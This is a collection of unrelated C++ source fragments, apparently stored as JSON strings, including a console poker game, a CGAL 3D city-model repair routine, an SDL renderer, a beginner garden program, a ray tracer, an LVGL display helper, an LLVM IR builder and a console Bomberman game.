------------------------------------------------------------\n\n\n\n// Game functions ---------------------------------------------\nvoid Game::dealCards() {\n    std::cout << \"Dealing cards..\\n\";\n    for (int i = 0; i < players.size(); i++) {\n        players[i].hand->newHand();\n    }\n    }\n\n\nvoid Game::nextState() {\n\n    switch (gameState) {\n    case 0: state = GameState::Preflop; gameState++;\n        break;\n    case 1: state = GameState::Flop; gameState++;\n        break;\n    case 2: state = GameState::Turn; gameState++;\n        break;\n    case 3: state = GameState::River; gameState++;\n        break;\n    case 4: state = GameState::Showdown;\n        break;\n    default: std::cerr << \"Invalid GameState\";\n    }\n\n}\n\n\nvoid Game::showComCards() {\n    setColor(14); // Yellow\n    std::cout << \"+-------------------------------------------------------+\" << std::endl;\n    std::cout << \"|                     COMMUNITY CARDS                   |\" << std::endl;\n    std::cout << \"+-------------------------------------------------------+\" << std::endl;\n    setColor(7); // White\n\n    switch (state) {\n    case GameState::Preflop:\n        preflop();\n        break;\n    case GameState::Flop:\n        flop();\n        break;\n    case GameState::Turn:\n        turn();\n        break;\n    case GameState::River:\n        river();\n        break;\n    case GameState::Showdown:\n        showdown();\n        gameEnded = true;\n        break;\n    default:\n        std::cout << \"Unknown game state!\" << std::endl;\n    }\n\n    setColor(14); // Yellow\n    std::cout << \"+-------------------------------------------------------+\" << std::endl;\n    std::cout << \"| Current Stage: \" << std::setw(39) << std::left;\n    switch (state) {\n    case GameState::Preflop: std::cout << \"Preflop\"; break;\n    case GameState::Flop: std::cout << \"Flop\"; break;\n    case GameState::Turn: std::cout << \"Turn\"; break;\n    case GameState::River: std::cout << \"River\"; break;\n    case GameState::Showdown: std::cout << \"Showdown\"; break;\n    }\n    std::cout << \" |\" << std::endl;\n    std::cout << \"+-------------------------------------------------------+\" << std::endl;\n    setColor(7); // White\n}\n\n\nvoid Game::river() {\n    setColor(10); // Light green\n    std::cout << \"                        RIVER ROUND                         \" << std::endl;\n    setColor(7); // White\n    std::cout << \"  \";\n    for (int x = 0; x < 5; x++) {\n        setColor(community[x].suitToString() == \"Hearts\" || community[x].suitToString() == \"Diamonds\" ? 12 : 15);\n        std::cout << community[x].toStringCard() << \"  \";\n    }\n    std::cout << std::endl << std::endl;\n}\n\nvoid Game::generateComCards() {\n    for (int i = 0; i < 5; i++) {\n        community.emplace_back(Card::summonCard());\n    }\n}\n\n\nvoid Game::preflop() {\n    setColor(10); // Light green\n    std::cout << \"                       PREFLOP ROUND                       \" << std::endl;\n    setColor(7); // White\n    std::cout << \"                     NO CARDS ON THE TABLE                 \" << std::endl << std::endl;\n}\n\n\nvoid Game::flop() {\n    setColor(10); // Light green\n    std::cout << \"                        FLOP ROUND                         \" << std::endl;\n    setColor(7); // White\n    std::cout << \"  \";\n    for (int x = 0; x < 3; x++) {\n        setColor(community[x].suitToString() == \"Hearts\" || community[x].suitToString() == \"Diamonds\" ? 12 : 15);\n        std::cout << community[x].toStringCard() << \"  \";\n    }\n    std::cout << std::endl << std::endl;\n}\n\n\nvoid Game::turn() {\n    setColor(10); // Light green\n    std::cout << \"                       TURN ROUND                      \" << std::endl;\n    setColor(7); // White\n    std::cout << \"  \";\n    for (int x = 0; x < 4; x++) {\n        setColor((community[x].suitToString() == \"Hearts\" || community[x].suitToString() == \"Diamonds\") ? 12 : 15);\n        std::cout << community[x].toStringCard() << \"  \";\n    }\n    std::cout << std::endl << std::endl;\n}\n\n\n\n\nvoid Game::showdown() {\n    setColor(10); // Ligth green\n    std::cout << \"                       SHOWDOWN RO",
    "\n// Copyright (c) 2024. // made for a proof of concept for thesis: \"Automatic repair of 3D citymodels\" by Lisa Keurentjes\n\n#include \"BuildingPartr3pair.h\"\n#include <CGAL/IO/Nef_polyhedron_iostream_3.h>\n#include <CGAL/Aff_transformation_3.h>\n#include <CGAL/boost/graph/convert_nef_polyhedron_to_polygon_mesh.h>\n\nnamespace AUTOr3pair {\n\n    json BuildingPartr3pair601(json &part1, json &part2, string &LOD) {\n      json Repairs;\n      vector<json> geomR1;\n      vector<json> geomR2;\n\n      vector<json> geom1;\n      vector<json> geom2;\n\n      vector<vector<Nef_polyhedron>> OuterShell1;\n      vector<vector<Nef_polyhedron>> OuterShell2;\n      map<Point3E, int> indexes;\n\n      for (auto &geom: part1[\"geometry\"]) {\n        string geomtype = geom[\"type\"];\n        if (LOD.find(geom[\"lod\"]) != std::string::npos && geomtype != \"MultiSurface\" &&\n            geomtype != \"CompositeSurface\") {\n          geom1.push_back(geom);\n          if (geomtype == \"Solid\") {\n            vector<vector<vector<int>>> shell = geom[\"boundaries\"][0];\n            Nef_polyhedron NefShell;\n            make_shell3D(shell, NefShell, indexes);\n            OuterShell1.push_back({NefShell});\n          }\n          if (geomtype == \"MultiSolid\" || geomtype == \"CompositeSolid\") {\n            vector<Nef_polyhedron> shells;\n            for (auto &Solids: geom[\"boundaries\"]) {\n              vector<vector<vector<int>>> shell = Solids[0];\n              Nef_polyhedron NefShell;\n              make_shell3D(shell, NefShell, indexes);\n              shells.push_back(NefShell);\n            }\n            OuterShell1.push_back(shells);\n          }\n        } else {\n          geomR1.push_back(geom);\n        }\n      }\n      for (auto &geom: part2[\"geometry\"]) {\n        string geomtype = geom[\"type\"];\n        if (LOD.find(geom[\"lod\"]) != std::string::npos && geomtype != \"MultiSurface\" &&\n            geomtype != \"CompositeSurface\") {\n          geom2.push_back(geom);\n          if (geomtype == \"Solid\") {\n            vector<vector<vector<int>>> shell = geom[\"boundaries\"][0];\n            Nef_polyhedron NefShell;\n            make_shell3D(shell, NefShell, indexes);\n            OuterShell2.push_back({NefShell});\n          }\n          if (geomtype == \"MultiSolid\" || geomtype == \"CompositeSolid\") {\n            vector<Nef_polyhedron> shells;\n            for (auto &Solids: geom[\"boundaries\"]) {\n              vector<vector<vector<int>>> shell = Solids[0];\n              Nef_polyhedron NefShell;\n              make_shell3D(shell, NefShell, indexes);\n              shells.push_back(NefShell);\n            }\n            OuterShell2.push_back(shells);\n          }\n        } else {\n          geomR2.push_back(geom);\n        }\n      }\n\n      // Initialize changes1 and changes2 based on the sizes of OuterShell1 and OuterShell2\n      vector<vector<bool>> changes1(OuterShell1.size()); // Number of rows based on OuterShell1\n      vector<vector<bool>> changes2(OuterShell2.size()); // Number of rows based on OuterShell2\n\n      // Populate changes1 to match the structure of OuterShell1\n      for (int i = 0; i < OuterShell1.size(); ++i) {\n        int m1 = OuterShell1[i].size(); // Number of columns in the current row of OuterShell1\n        changes1[i] = vector<bool>(m1, false); // Initialize this row with 'false'\n      }\n\n      // Populate changes2 to match the structure of OuterShell2\n      for (int i = 0; i < OuterShell2.size(); ++i) {\n        int m2 = OuterShell2[i].size(); // Number of columns in the current row of OuterShell2\n        changes2[i] = vector<bool>(m2, false); // Initialize this row with 'false'\n      }\n\n      for (int i = 0; i < OuterShell1.size(); ++i) {\n        for (int j = 0; j < OuterShell1[i].size(); ++j) {\n          if (!OuterShell1[i][j].is_valid() || OuterShell1[i][j].is_empty()){\n            continue;\n          }\n          for (int k = 0; k < OuterShell2.size(); ++k) {\n            for (int l = 0; l < OuterShell2[k].size(); ++l) {\n              if (!OuterShell2[k][l].is_valid() || OuterShell2[k][l].is_empty()){\n                continue;\n              }\n              Nef_polyhedron intersection = OuterShell1[i][j] * OuterShell2[k][l];\n\n              if (intersection.number_of_volumes() >= 2){\n                // check overlap vs merge tol\n                if (STANDARDS[\"OutputParameters\"][\"Debugging\"]) {\n                  std::cout << \"original \" << CalculateVolume(OuterShell1[i][j]) << endl;\n                  std::cout << \"intersection \" << CalculateVolume(intersection) << endl;\n                  std::cout << \"overlap% \" << (CalculateVolume(intersection) / CalculateVolume(OuterShell1[i][j]))\n                            << endl;\n                }\n\n                if ((CalculateVolume(intersection) / CalculateVolume(OuterShell1[i][j])) > STANDARDS[\"UseCaseRepair\"][\n                        \"MergeTol\"]) {\n                  OuterShell1[i][j] += OuterShell2[k][l];\n                  OuterShell2[k][l] -= OuterShell2[k][l];\n                  changes1[i][j] = true;\n                  changes2[k",
    "#include \"Renderer/Renderer.h\"\n\nnamespace Rend\n{\nusing namespace std;\nRenderer::Renderer(int32_t width, int32_t hight)\n: m_width(width)\n, m_hight(hight)\n, m_window(nullptr)\n, m_renderer(nullptr)\n{\n    m_window = SDL_CreateWindow(\"SDL Window\",SDL_WINDOWPOS_UNDEFINED,SDL_WINDOWPOS_UNDEFINED,m_width,m_hight,SDL_WINDOW_ALLOW_HIGHDPI);\n    if (m_window == nullptr)\n    {\n        SDL_Log(\"SDL_CreateWindow Error: %s\\n\", SDL_GetError());\n    }\n\n    m_renderer = SDL_CreateRenderer(m_window,-1,SDL_RENDERER_ACCELERATED);\n    if (m_renderer == nullptr)\n    {\n        SDL_Log(\"SDL_CreateRenderer Error: %s\\n\", SDL_GetError());\n    }\n    SDL_SetRenderDrawBlendMode(m_renderer,SDL_BLENDMODE_BLEND);\n}\n\nRenderer::~Renderer()\n{\n    if (m_renderer != nullptr) {\n        SDL_DestroyRenderer(m_renderer);  \n        m_renderer = nullptr;            \n    }\n    if (m_window != nullptr) {\n        SDL_DestroyWindow(m_window);      \n        m_window = nullptr;               \n    }\n    SDL_Quit();\n}\n\nvoid Renderer::addObjectToRender(std::shared_ptr<IRenderObject> renderObject)\n{\n    m_objectToRender.push_back(std::move(renderObject));\n}\n\nvoid Renderer::renderRect(std::shared_ptr<IRenderObject> object)\n{\n    std::pair<int, int> pos = object->getPosOfObject();\n    std::pair<int, int> widthAndHight = object->getWidthAndhight();\n    SDL_Color color = object->getColour();\n    SDL_Rect rec = {pos.first, \n                    pos.second, \n                    widthAndHight.first, widthAndHight.second};\n    SDL_SetRenderDrawColor(m_renderer, color.r, color.g, color.b, color.a);\n    SDL_RenderFillRect(m_renderer, &rec);\n}\n\nvoid Renderer::renderImage(std::shared_ptr<IRenderObject> object)\n{\n    std::string imagePath = object->getImagePath();\n    texture = IMG_LoadTexture(m_renderer,imagePath.c_str());\n\n    if (texture == nullptr)\n    {\n        std::cout << \"Failed to load texture from \" << imagePath << \"! SDL_image Error: \" << IMG_GetError() << std::endl;\n        return;\n    }\n    std::pair<int, int> pos = object->getPosOfObject();\n    std::pair<int, int> size = object->getWidthAndhight();\n    SDL_Rect renderQuad = { pos.first, \n                            pos.second, \n                            size.first, \n                            size.second };\n    SDL_RenderCopy(m_renderer, texture, nullptr, &renderQuad);\n    SDL_DestroyTexture(texture);\n}\n\nvoid Renderer::renderObject()\n{   \n    SDL_RenderClear(m_renderer);\n    for(int32_t index = 0; index <  m_objectToRender.size(); index++)\n    {\n        renderThisObject(m_objectToRender[index]);\n    }\n    SDL_RenderPresent(m_renderer);\n}\n\nvoid Renderer::renderThisObject(std::shared_ptr<IRenderObject> object)\n{\n    RenderType type = object->getRenderType();\n    switch (type)\n    {\n    case RenderType::Rectangle:\n        renderRect(object);\n        break;\n    case RenderType::image:\n        renderImage(object);\n        break;\n    default:\n        break;\n    }\n}\n\nvoid Renderer::removeObject(const std::string& ID)\n{\n    auto it = m_objectToRender.begin();\n    \n    while (it < m_objectToRender.end())\n    {\n        if ((*it)->getID() == ID)\n        {\n            it = m_objectToRender.erase(it);\n        }\n        else\n        {\n            ++it;\n        }\n    }\n}\nvoid Renderer::renderBackground(int32_t red, int32_t green, int32_t blue, int32_t alpha)\n{\n    SDL_RenderClear(m_renderer);\n    SDL_SetRenderDrawColor(m_renderer, red, green, blue, alpha);\n}\n\n} // namespace Rend",
    "#include <iostream>\n#include <chrono>\n#include <time.h>\n#include <string>\n#include <vector>\n#include <random>\n#include <algorithm>\n#include <ostream>\n\nclass Nature {\nprivate:\n\nint Plantscount;\nint gardenCount;\nstd::vector<std::string> plants;\nstd::string input;\n\npublic:\nvoid CellsOnGarden();\nvoid HowMany();\nvoid WhatGrowing();\nvoid checkWhatGrowing();\nvoid checkCells();\nvoid substract();\nvoid randomPlant();\n\n};\n\nint main(int argc, char** argv) {\nNature nature;\nint ch;\n\nwhile(1) {\nstd::cout << \"\\n1. Enter cells garden\" << std::endl;\nstd::cout << \"2. Enter how many garden u want to grow\" << std::endl;\nstd::cout << \"3. Enter plant that u want grow: \" << std::endl;\nstd::cout << \"4. Check how many cells avalaible\" << std::endl;\nstd::cout << \"5. Random plant grow\" << std::endl;\nstd::cin >> ch;\n   \nswitch (ch)\n{\ncase 1:\nnature.CellsOnGarden();\nbreak;\n\ncase 2:\nnature.HowMany();\nnature.substract();\nbreak;\n\ncase 3:\nnature.WhatGrowing();\n//nature.checkWhatGrowing();\nbreak;\n\ncase 4:\nnature.checkCells();\nbreak;\n\ncase 5:\nnature.randomPlant();\n\ncase 0:\nexit(0);\n\ndefault:\nstd::cout << \"Invalid number!\" << std::endl;\n\n}\n\n}\n    return 0;\n}\n\nvoid Nature::CellsOnGarden() {\n    std::cout << \"Enter cells on Garden: \" << std::endl;\n    std::cin >> gardenCount;\n   \n}\n\nvoid Nature::HowMany() {\n    std::cout << \"How many plants you want to grow: \" << std::endl;\n    std::cin >> Plantscount;\n    std::cout << \"plants what u want to grow: \" << Plantscount << std::endl;\n gardenCount - Plantscount;\n\n    if(Plantscount > gardenCount) {\n        std::cout << \"No free cells for plants\" << std::endl;\n        std::cout << \"No more, pls!\" << std::endl;\n    }\n\n}\n\nvoid Nature::WhatGrowing() {\n    std::string back;\n    std::cout << \"What plant u want: \";\n    std::cin >> back;\n    plants.push_back(back); \n    std::cout << back;\n}\n\n// void Nature::checkWhatGrowing() {\n\n// std::cout << \"Plants: \" << \", \" << back;\n\n// }\n\n\nvoid Nature::checkCells() {\n    std::cout << \"Cells on garden: \" << gardenCount << std::endl;\n}\n\nvoid Nature::substract() {\ngardenCount = gardenCount - Plantscount;\n}\n\nvoid Nature::randomPlant() {\n\n\nstd::default_random_engine generator;\nstd::uniform_int_distribution<int> distribution(1, 5);\nint ran = distribution(generator);\n\nif(1) \n{\nplants.push_back(\"White cabbage\");\n std::string *back = &plants.back();\nstd::cout << *back << std::endl;\n}\n\nif(2) \n{\nplants.push_back(\"Red cabbage\");\n std::string *back = &plants.back();\nstd::cout << *back << std::endl;\n}\n\nif(ran == 3) \n{\nplants.push_back(\"Color cabbage\");\n std::string *back = &plants.back();\nstd::cout << *back << std::endl;\n}\n\nif(ran == 4) \n{\nplants.push_back(\"Pekin cabbage\");\n std::string *back = &plants.back();\nstd::cout << *back << std::endl;\n}\n\nif(ran == 5) \n{\nplants.push_back(\"Brussels sprouts\");\n std::string *back = &plants.back();\nstd::cout << *back << std::endl;\n}\n\n\n\n}",
    "#include \"../../include/Object.h\"\n#include \"../../include/Ray.h\"\n#include \"../../include/RaySurfaceIntersection.h\"\n\nusing namespace std;\n\nObject::Object()\n{\n\tthis->colour = Rgb(0, 255, 0);\n}\n\nObject::Object(Object& object)\n{\n\tthis->colour = Rgb(0, 0, 0);\n\tfor (int i = 0; i < object.surfaces.size(); i++)\n\t{\n\t\tthis->addSurface(object.surfaces.at(i)->clone());\n\t}\n}\n\nObject::~Object()\n{\n\tfor (int i = 0; i < surfaces.size(); i++)\n\t{\n\t\tdelete surfaces.at(i);\n\t}\n}\n\nvector<RaySurfaceIntersection> Object::intersections(Ray ray)\n{\n\tvector<RaySurfaceIntersection> returnVector;\n\n\tfor (int i = 0; i < surfaces.size(); i++)\n\t{\n\t\tvector<Vector3D> intersects = surfaces.at(i)->intersections(ray);\n\t\tfor (int j = 0; j < intersects.size(); j++)\n\t\t{\n\t\t\tVector3D intersection = intersects.at(j);\n\t\t\tSurface* surface = surfaces.at(i);\n\t\t\treturnVector.push_back(\n\t\t\t\tRaySurfaceIntersection(\n\t\t\t\t\tintersection,\n\t\t\t\t\tsurface->getNormal(intersection),\n\t\t\t\t\tsurface->getColour(),\n\t\t\t\t\tsurface->getSpecularCoefficient()\n\t\t\t\t)\n\t\t\t);\n\t\t}\n\t}\n\n\treturn returnVector;\n}\n\nvoid Object::addSurface(Surface* surface)\n{\n\tsurfaces.push_back(surface);\n}\n\nvoid Object::transform(Vector3D translation, Vector3D rotation)\n{\n\tfor (int i = 0; i < surfaces.size(); i++)\n\t{\n\t\tsurfaces.at(i)->transform(translation, rotation);\n\t}\n}\n\nvoid Object::translate(Vector3D translation)\n{\n\tfor (int i = 0; i < surfaces.size(); i++)\n\t{\n\t\tsurfaces.at(i)->translate(translation);\n\t}\n}\n\nvoid Object::rotate(Vector3D rotation)\n{\n\tfor (int i = 0; i < surfaces.size(); i++)\n\t{\n\t\tsurfaces.at(i)->rotate(rotation);\n\t}\n}\n\nvoid Object::setColour(Rgb colour)\n{\n\tthis->colour = colour;\n}\n\nRgb Object::getColour()\n{\n\treturn this->colour;\n}",
    "/**\n * @file      LV_Helper.cpp\n * @author    Lewis He (lewishe@outlook.com)\n * @license   MIT\n * @copyright Copyright (c) 2023  Shenzhen Xin Yuan Electronic Technology Co., Ltd\n * @date      2023-09-22\n *\n */\n\n#include \"LV_Helper.h\"\n//#include \"utilities.h\"\n#include <TFT_eSPI.h>\n\n\n\nTFT_eSPI tft = TFT_eSPI();\n\n\n#define BOARD_TFT_WIDTH     170 \n#define BOARD_TFT_HEIHT     320\n\n\nstatic void lv_disp_flush(lv_disp_drv_t *disp, const lv_area_t *area,\n                          lv_color_t *color_p)\n{\n    uint32_t w = ( area->x2 - area->x1 + 1 );\n    uint32_t h = ( area->y2 - area->y1 + 1 );\n    tft.startWrite();\n    tft.setAddrWindow( area->x1, area->y1, w, h );\n    tft.pushColors( ( uint16_t * )&color_p->full, w * h, false );\n    tft.endWrite();\n    lv_disp_flush_ready( disp );\n}\n\nstatic void lv_touchpad_read(lv_indev_drv_t *indev_driver, lv_indev_data_t *data)\n{\n\n}\n\n\n\n\n\n\n\n\n\nvoid lv_helper(uint8_t r)\n{\n    static lv_color_t *frameBuffer;\n    static lv_disp_drv_t disp_drv;\n    static lv_disp_draw_buf_t draw_buf;\n\n\n\n\n    // Init Display\n    tft.init();\n    tft.fillScreen(TFT_BLACK);\n    tft.setRotation(1);\n\n\n\n    lv_init();\n\n    size_t buffer_size = sizeof(lv_color_t) * tft.width() * tft.height();\n    frameBuffer  = (lv_color_t *)ps_malloc(buffer_size);\n    assert(frameBuffer);\n\n    lv_disp_drv_init(&disp_drv);\n    lv_disp_draw_buf_init(&draw_buf, frameBuffer, NULL, buffer_size);\n\n    disp_drv.hor_res = tft.width();\n    disp_drv.ver_res = tft.height();\n    disp_drv.flush_cb = lv_disp_flush;\n    disp_drv.draw_buf = &draw_buf;\n    lv_disp_drv_register(&disp_drv);\n\n    static lv_indev_drv_t indev_drv;\n    lv_indev_drv_init(&indev_drv);\n    indev_drv.type = LV_INDEV_TYPE_POINTER;\n    indev_drv.read_cb = lv_touchpad_read;\n    lv_indev_drv_register(&indev_drv);\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "#include \"llvm_model.h\"\n\nstd::string pl::LMPublicFunc::obtain_stack_mem(std::string t, int a, std::string n) {\n  stack_pool_assignments[n] = stack_pool.size();\n  stack_pool.push_back({ t, \"%.\" + std::to_string(stack_pool.size() + 1), a });\n  return stack_pool.back().name;\n}\n\nstd::string pl::LMPublicFunc::get_mem_addr_ptr(std::string n) {\n  return stack_pool.at(stack_pool_assignments.at(n)).name;\n}\n\nstd::string pl::LMPublicFunc::get_variable_type(std::string n) {\n  return stack_pool.at(stack_pool_assignments.at(n)).type;\n}\n\nstd::string pl::LlvmModel::get_size_type() {\n  return size_type;\n}\n\npl::LMStringLit& pl::LlvmModel::register_string_lit(std::string s) {\n  std::string d;\n  size_t size = s.size();\n  bool bs = false;\n  for (char ch : s) {\n    if (bs) {\n      switch (ch) {\n        case 'n':\n          d += \"\\\\0A\";\n          break;\n        default:\n          size++;\n          d += \"\\\\\\\\\" + ch;\n      }\n      bs = false;\n      continue;\n    }\n    if (ch == '\\\\') {\n      size--;\n      bs = true;\n      continue;\n    }\n    d += ch;\n  }\n  string_lits.push_back({ d + \"\\\\00\", \"@.str.\" + std::to_string(string_lits.size()), size + 1 });\n  return string_lits.back();\n}\n\nvoid pl::LlvmModel::register_public_func(LMPublicFunc f) {\n  public_funcs.push_back(f);\n}\n\npl::LMPublicFunc& pl::LlvmModel::get_last_registered_public_func() {\n  return public_funcs.back();\n}\n\nvoid pl::LlvmModel::register_public_func_def(LMPublicFuncDef f) {\n  public_func_defs.push_back(f);\n}\n\nsize_t pl::LlvmModel::register_attrs(LMAttrs a) {\n  for (LMAttrs attr : attrs) {\n    if (attr.any_attrs == a.any_attrs && attr.plat_attrs == a.plat_attrs) {\n      return attr.index;\n    }\n  }\n  a.index = attrs.size();\n  attrs.push_back(a);\n  return attrs.size() - 1;\n}\n\nstd::string pl::LlvmModel::obtain_function_type(std::string name, size_t l, size_t c) {\n  for (LMPublicFuncDef& public_func_def : public_func_defs) {\n    if (public_func_def.name == name) {\n      return public_func_def.return_type;\n    }\n  }\n  error(\"Unknown function: \" + name, l, c);\n  return \"\";\n}\n\nstd::vector<pl::LMPublicFuncDef::__params_t> pl::LlvmModel::obtain_function_param_types(std::string name, size_t l, size_t c) {\n  for (LMPublicFuncDef& public_func_def : public_func_defs) {\n    if (public_func_def.name == name) {\n      return public_func_def.params;\n    }\n  }\n  error(\"Unknown function: \" + name, l, c);\n  return {};\n}\n\nstd::string pl::LlvmModel::build_llvm() {\n  std::string s;\n\n  for (LMStringLit& string_lit : string_lits) {\n    s += string_lit.id + \" = private unnamed_addr constant [\" + std::to_string(string_lit.size) + \" x i8] c\\\"\" + string_lit.data + \"\\\", align 1\\n\";\n  }\n\n  s += \"\\n\";\n\n  for (LMPublicFunc& public_func : public_funcs) {\n    s += \"define dso_\" + public_func.dso + \" \" + public_func.return_type + \" @\" + public_func.name + \"() #\" + std::to_string(register_attrs(LMAttrs{ public_func.attrs })) + \" {\\n\";\n    for (LMPublicFunc::__stack_ssa_pool_entry stack_pool_entry : public_func.stack_pool) {\n      s += \"\\t\" + stack_pool_entry.name + \" = alloca \" + stack_pool_entry.type + \", align \" + std::to_string(stack_pool_entry.alignment) + \"\\n\";\n    }\n    for (std::string& line : public_func.contents) {\n      s += \"\\t\" + line + \"\\n\";\n    }\n    s += \"}\\n\";\n  }\n\n  s += \"\\n\";\n\n  for (LMPublicFuncDef& public_func_def : public_func_defs) {\n    s += \"declare \" + public_func_def.return_type + \" @\" + public_func_def.name + \"(\";\n    for (size_t i = 0; i < public_func_def.params.size(); i++) {\n      s += public_func_def.params.at(i).type;\n      for (std::string& flag : public_func_def.params.at(i).flags) {\n        s += \" \" + flag;\n      }\n      if (i < public_func_def.params.size() - 1) {\n        s += \", \";\n      }\n    }\n    s += \") #\" + std::to_string(register_attrs(LMAttrs{ public_func_def.attrs })) + \"\\n\";\n  }\n\n  s += \"\\n\";\n\n  for (LMAttrs& attr : attrs) {\n    s += \"attributes #\" + std::to_string(attr.index) + \" = { \";\n    for (std::string& any_attr : attr.any_attrs) {\n      s += any_attr + \" \";\n    }\n    for (std::string& plat_attr : attr.plat_attrs) {\n      s += plat_attr + \" \";\n    }\n    s += \"}\\n\";\n  }\n\n  return s;\n}\n",
    "\ufeff#include <iostream>\r\n#include <windows.h> // \u043e\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043a\u043e\u043d\u0441\u043e\u043b\u0438 \u0438 \u0440\u0430\u0431\u043e\u0442\u0430 \u0441 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u043c\u0438\r\n#include <conio.h>\r\n#include <string>\r\n#include\"BomberMan.h\"\r\n\r\n\r\n\r\nint main()\r\n{\r\n\tsetlocale(LC_ALL, \"rus\");\r\n\t//\u0442\u0430\u0431\u043b\u0438\u0446\u0430 \u0430\u0441\u043a\u0438 \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432 \u043f\u0441\u0435\u0432\u0434\u043e\u0433\u0440\u0430\u0444\u0438\u043a\u0438\r\n\t/*for (int code = 0; code < 256; code++)\r\n\t{\r\n\t\tcout << code << \" - \" << (char)code << \"\\n\";\r\n\t}*/\r\n\r\n\t//\u043c\u0435\u043d\u044f\u0435\u043c \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a \u043e\u043a\u043d\u0430\r\n\tsystem(\"title \u0411\u043e\u043c\u0431\u0435\u0440!\");\r\n\t\r\n\t// \u0434\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440 \u043e\u043a\u043d\u0430 \u043a\u043e\u043d\u0441\u043e\u043b\u0438 (\u043f\u043e\u0440\u044f\u0434\u043a\u043e\u0432\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u043e\u043a\u043d\u0430 \u0432 \u0441\u0438\u0441\u0442\u0435\u043c\u0435)\r\n\tHANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\r\n\t// \u0441\u043a\u0440\u044b\u0442\u044c \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u043c\u0438\u0433\u0430\u044e\u0449\u0438\u0439 \u043a\u0443\u0440\u0441\u043e\u0440\r\n\tCONSOLE_CURSOR_INFO info;\r\n\tinfo.bVisible = false;\r\n\tinfo.dwSize = 100;\r\n\r\n\tSetConsoleCursorInfo(consoleHandle, &info);\r\n\r\n\t// \u043c\u043e\u0434\u0435\u043b\u044c \u043b\u043e\u043a\u0430\u0446\u0438\u0438\r\n\t// 0 - \u043a\u043e\u0440\u0438\u0434\u043e\u0440\u044b (\u043f\u0443\u0441\u0442\u043e\u0442\u044b)\r\n\t// 1 - \u0441\u0442\u0435\u043d\u0430 \u0440\u0430\u0437\u0440\u0443\u0448\u0430\u0435\u043c\u0430\u044f\r\n\t// 2 - \u043c\u043e\u043d\u0435\u0442\u043a\u0438\r\n\t// 3 - \u0432\u0440\u0430\u0433\u0438\r\n\r\n\tconst int WIDTH = 50;\r\n\tconst int HEIGHT = 15;\r\n\tint location[HEIGHT][WIDTH] = {};\r\n\tObjectCount countOfObject;\r\n\r\n\r\n\t// \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043b\u043e\u043a\u0430\u0446\u0438\u0438\r\n\tfillPlayDesk(location, countOfObject, HEIGHT, WIDTH, MAX_OBJECTS);\r\n\r\n\t//\u0441\u0447\u0438\u0442\u0430\u044e \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u043d\u0430 \u0434\u043e\u0441\u043a\u0435 \u0447\u0435\u0433\u043e\r\n\tcountObjects(location, HEIGHT, WIDTH, countOfObject);\r\n\t\r\n\t// \u043f\u043e\u043a\u0430\u0437 \u043b\u043e\u043a\u0430\u0446\u0438\u0438\r\n\tshowDesk(location, HEIGHT, WIDTH, consoleHandle);\r\n\t\r\n\t// \u0440\u0430\u0437\u043c\u0435\u0449\u0435\u043d\u0438\u0435 \u0413\u0413 (\u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u043e\u0433\u043e \u0433\u043b\u0430\u0432\u043d\u043e\u0433\u043e \u0433\u0435\u0440\u043e\u044f, \u0442\u0430\u043a\u0436\u0435 \u043c\u043e\u0436\u043d\u043e \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u044c \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u0434\u043b\u044f \u0433\u0435\u0440\u043e\u044f)\r\n\tPlayer player;\t\r\n\t\r\n\t// \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438 \u043a\u0443\u0440\u0441\u043e\u0440\u0430 \u0432 \u043b\u044e\u0431\u0443\u044e \u0442\u043e\u0447\u043a\u0443 \u043d\u0430 \u044d\u043a\u0440\u0430\u043d\u0435 \u043a\u043e\u043d\u0441\u043e\u043b\u0438\r\n\tdrawObject(consoleHandle, player.m_position, player.m_symbol, player.m_color);\r\n\t\r\n\t// \u0438\u0433\u0440\u043e\u0432\u043e\u0439 \u0434\u0432\u0438\u0436\u043e\u043a (\u0438\u043d\u0442\u0435\u0440\u0430\u043a\u0442\u0438\u0432 \u0441 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u043c)\r\n\twhile(true) {\r\n\t\t\r\n\t\t//\u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e \u0441\u0442\u0430\u0442\u044b\r\n\t\tshowStats(consoleHandle, countOfObject, player);\r\n\r\n\t\tif(location[player.m_position.Y][player.m_position.X] == ENEMY) {\r\n\r\n\t\t\tplayer.m_health -= 20;\r\n\t\t\t--countOfObject.m_enemy;\r\n\r\n\t\t\tlocation[player.m_position.Y][player.m_position.X] = HALL;\r\n\t\t}\r\n\r\n\t\tint code = _getch(); // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u0440\u0438\u043e\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u0442 \u0440\u0430\u0431\u043e\u0442\u0443 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b, \u0436\u0434\u0451\u0442 \u0440\u0435\u0430\u043a\u0446\u0438\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n\t\t\r\n\t\tif(code == 224)\r\n\t\t\tcode = _getch(); // \u0435\u0441\u043b\u0438 \u043f\u0435\u0440\u0432\u044b\u0439 \u043a\u043e\u0434 \u0431\u044b\u043b 224, \u0442\u043e \u043f\u043e\u0432\u0442\u043e\u0440\u043d\u044b\u0439 \u0432\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0432\u0435\u0440\u043d\u0451\u0442 